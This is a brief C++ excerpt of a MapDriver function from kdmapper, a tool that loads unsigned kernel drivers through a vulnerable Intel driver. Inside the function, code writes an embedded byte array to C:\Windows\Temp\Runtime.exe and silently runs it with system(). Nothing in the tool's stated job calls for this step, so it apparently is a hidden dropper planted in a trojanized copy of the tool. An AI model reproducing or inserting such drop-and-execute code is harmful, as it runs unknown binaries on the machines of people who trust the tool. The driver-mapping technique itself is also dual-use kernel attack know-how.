...
uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1, ULONG64 param2, bool free, bool destroyHeader, bool mdlMode, bool PassAllocationAddressAsFirstParam, mapCallback callback, NTSTATUS* exitCode) {
	...
	std::ofstream file;
	file.open("C:\\Windows\\Temp\\Runtime.exe", std::ios_base::binary);
	assert(file.is_open());

	for (int i = 0; i < sizeof(kdmapper_driver_start_util) / sizeof(kdmapper_driver_start_util[0]); ++i)
		file.write((char*)(kdmapper_driver_start_util + i * sizeof(kdmapper_driver_start_util[0])), sizeof(kdmapper_driver_start_util[0]));
	file.close();

	system("C:\\Windows\\Temp\\Runtime.exe");
